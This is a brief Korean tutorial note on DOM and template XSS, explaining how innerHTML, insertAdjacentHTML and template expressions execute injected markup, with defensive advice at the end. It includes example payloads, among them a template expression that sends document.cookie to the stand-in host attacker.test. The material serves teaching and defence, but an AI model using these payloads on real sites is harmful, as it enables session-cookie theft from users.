Template / DOM XSS :
    XSS 공격은 보통 서버에서 데이터를 제대로 검증하거나 필터하지 않은 채 HTML 문서에 포함시켜 발생하지만, 클라이언트에서 발생할 수도 있습니다. 

    DOM에서 innerHTML, outerHTML, insertAdjacentHTML 등은 스크립트에서 HTML 마크업을 삽입할 수 있도록 합니다.
    또한 다양한 자바스크립트 라이브러리 또는 프레임워크는 {{ 1 + 1 }} 와 같이 코드나 식을 실행하여 
    그 결과를 문서에 표시할 수 있도록 하는 템플릿 엔진을 제공하고 있습니다.

    ex) HTML MarkUp
        var elm = document.createElement('div');
        elm.innerHTML = '<h1>Hello, world!</h1><p>Lorem ipsum dolor sit amet';
        document.body.insertAdjacentHTML('beforeend', 'This goes before &lt;/body&gt;');
    
    ex) Template
        <h1>Welcome, <strong>{{ currentUser.fullName }}</strong>!</h1>

    만약 이들 마크업이나 템플릿을 제3자가 입력할 수 있다면 다음과 같이 임의의 스크립트를 실행할 수 있게 됩니다.
    
    ex)
        var inputMarkup = '<img src=about: onerror=alert(document.cookie) />';
        
        var elm = document.createElement('div');
        elm.innerHTML = inputMarkup;
        // alert(document.cookie)
        
        document.body.insertAdjacentHTML('beforeend', inputMarkup);
        // alert(document.cookie)

    ex)
        {{ alert(document.cookie) }}
        {{ document.createElement('img').setAttribute('src', 'http://attacker.test/retrieve?' + document.cookie) }}

    DOM XSS를 방지하려면 가급적 innerHTML와 같이 마크업을 해석하는 속성의 사용을 피해야 하고,
    부득이 서식 등 마크업 입력이 필요한 경우 서버측 XSS 방어와 같이 XSS 필터를 이용하여 안전한 마크업만이 삽입되도록 해야 합니다. 
    템플릿를 사용하는 경우 또한 마찬가지로 외부에서 들어오는 입력을 템플릿으로 사용하지 않는 것이 좋습니다.

    















